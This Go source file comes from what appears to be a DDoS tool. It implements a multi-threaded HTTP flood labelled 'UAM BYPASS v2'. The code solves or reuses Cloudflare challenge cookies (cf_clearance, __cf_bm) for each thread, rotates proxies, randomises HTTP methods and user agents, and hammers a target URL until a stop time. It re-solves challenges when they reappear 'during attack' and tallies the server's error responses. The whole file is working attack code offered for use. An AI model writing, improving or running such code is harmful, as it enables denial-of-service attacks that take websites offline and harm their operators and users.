package main

import (
	"fmt"
	mrand "math/rand"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type threadSolver struct {
	mu          sync.Mutex
	client      *http.Client
	proxyAddr   string
	clearance   string
	cfBm        string
	userAgent   string
	lastSolve   time.Time
	solveCount  int
	failCount   int
	maxFails    int
}

func newThreadSolver(proxyAddr string) *threadSolver {
	ts := &threadSolver{
		proxyAddr: proxyAddr,
		maxFails:  3,
		userAgent: randomBypassUA(),
	}
	if cfg.useProxy && proxyAddr != "" {
		ts.client = getProxyClient(proxyAddr)
	} else {
		ts.client = newUTLSHTTPClient()
	}
	return ts
}

func (ts *threadSolver) ensureClearance() bool {
	ts.mu.Lock()
	defer ts.mu.Unlock()

	if ts.failCount >= ts.maxFails {
		return false
	}

	entry := cfStore.Get(cfg.targetHost)
	if entry != nil && entry.clearance != "" {
		ts.clearance = entry.clearance
		ts.cfBm = entry.cfBm
		ts.userAgent = entry.userAgent
		ts.lastSolve = time.Now()
		return true
	}

	result := solveCFChallenge(targetURL, ts.client, ts.userAgent, ts.proxyAddr)
	if result.Success && result.CfClearance != "" {
		ts.clearance = result.CfClearance
		ts.cfBm = result.CfBm
		if result.UserAgent != "" {
			ts.userAgent = result.UserAgent
		}
		ts.lastSolve = time.Now()
		ts.solveCount++
		ts.failCount = 0
		atomic.AddUint64(&totalBypass, 1)
		fmt.Printf("[UAM] Thread solved via %s (attempt %d)\n", ts.proxyAddr, ts.solveCount)
		return true
	}

	ts.failCount++
	fmt.Printf("[UAM] Solve failed (%d/%d): %s\n", ts.failCount, ts.maxFails, result.Error)
	return false
}

func (ts *threadSolver) applyCookies(client *http.Client) {
	ts.mu.Lock()
	clearance := ts.clearance
	cfBm := ts.cfBm
	ts.mu.Unlock()

	if clearance == "" && cfBm == "" {
		return
	}
	client.Jar = newCookieJar()
	u, _ := url.Parse(targetURL)
	cookies := []*http.Cookie{}
	if clearance != "" {
		cookies = append(cookies, &http.Cookie{Name: "cf_clearance", Value: clearance, Domain: cfg.targetHost, Path: "/"})
	}
	if cfBm != "" {
		cookies = append(cookies, &http.Cookie{Name: "__cf_bm", Value: cfBm, Domain: cfg.targetHost, Path: "/"})
	}
	client.Jar.SetCookies(u, cookies)
}

func (ts *threadSolver) needsRefresh() bool {
	ts.mu.Lock()
	defer ts.mu.Unlock()
	if ts.clearance == "" {
		return true
	}
	if time.Since(ts.lastSolve) > CF_CLEARANCE_TTL-5*time.Minute {
		return true
	}
	return false
}

func executeMixVectorUAMBypass(threadCount int) {
	fmt.Printf("[VECTOR] UAM BYPASS v2 — JSD PoW Solver + API Fallback + Per-Thread Clearance\n")

	if cfg.cfClearance != "" {
		cfStore.Set(cfg.targetHost, cfg.cfClearance, cfg.cfBm, cfg.userAgent)
		fmt.Printf("[UAM] Using pre-solved cf_clearance from server\n")
	}

	var wg sync.WaitGroup
	solvers := make([]*threadSolver, threadCount)
	for i := 0; i < threadCount; i++ {
		var proxyAddr string
		if cfg.useProxy && len(proxyList) > 0 {
			proxyAddr = getNextProxy()
		}
		solvers[i] = newThreadSolver(proxyAddr)
	}

	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			ts := solvers[id]
			rng := mrand.New(mrand.NewSource(time.Now().UnixNano() + int64(id)))

			if !ts.ensureClearance() {
				return
			}

			for time.Now().Before(stopTime) {
				if ts.needsRefresh() {
					if !ts.ensureClearance() {
						fmt.Printf("[UAM] Thread %d: fatal solve failure, stopping\n", id)
						return
					}
				}

				var reqClient *http.Client
				if cfg.useProxy && len(proxyList) > 0 {
					proxyAddr := getNextProxy()
					reqClient = getProxyClient(proxyAddr)
				} else {
					reqClient = newUTLSHTTPClient()
				}
				ts.applyCookies(reqClient)

				methods := []string{"GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH", "DELETE"}
				method := methods[rng.Intn(len(methods))]
				withBody := method == "POST" || method == "PUT" || method == "PATCH"

				reqPool := make([]*http.Request, POOL_SIZE_FLOOD)
				for p := 0; p < len(reqPool); p++ {
					reqPool[p], _ = buildRequest(method, targetURL, withBody, 2)
					reqPool[p].Header.Set("User-Agent", ts.userAgent)
				}

				checkChallenge := rng.Intn(5) == 0
				for j := 0; j < len(reqPool) && time.Now().Before(stopTime); j++ {
					resp, err := reqClient.Do(reqPool[j])
					if err != nil {
						atomic.AddUint64(&totalErrors, 1)
						if strings.Contains(err.Error(), "timeout") {
							atomic.AddUint64(&totalTimeout, 1)
						}
						continue
					}

					if checkChallenge {
						body, _ := ioReadAll(resp.Body)
						resp.Body.Close()
						if isCFChallenge(resp, body) {
							fmt.Printf("[UAM] Challenge detected during attack, re-solving...\n")
							ts.failCount = 0
							ts.clearance = ""
							ts.ensureClearance()
							checkChallenge = false
							continue
						}
						atomic.AddUint64(&totalRequests, 1)
						switch {
						case resp.StatusCode >= 200 && resp.StatusCode < 300:
							atomic.AddUint64(&total2xx, 1)
						case resp.StatusCode >= 300 && resp.StatusCode < 400:
							atomic.AddUint64(&total3xx, 1)
						case resp.StatusCode >= 400 && resp.StatusCode < 500:
							atomic.AddUint64(&total4xx, 1)
						case resp.StatusCode >= 500:
							atomic.AddUint64(&total5xx, 1)
						}
					} else {
						body, _ := ioReadAll(resp.Body)
						resp.Body.Close()
						if isCFChallenge(resp, body) {
							ts.failCount = 0
							ts.clearance = ""
							go ts.ensureClearance()
						}
						atomic.AddUint64(&totalRequests, 1)
						_ = body
					}
				}
				time.Sleep(randomThinkTime())
			}
		}(i)
	}
	wg.Wait()
}
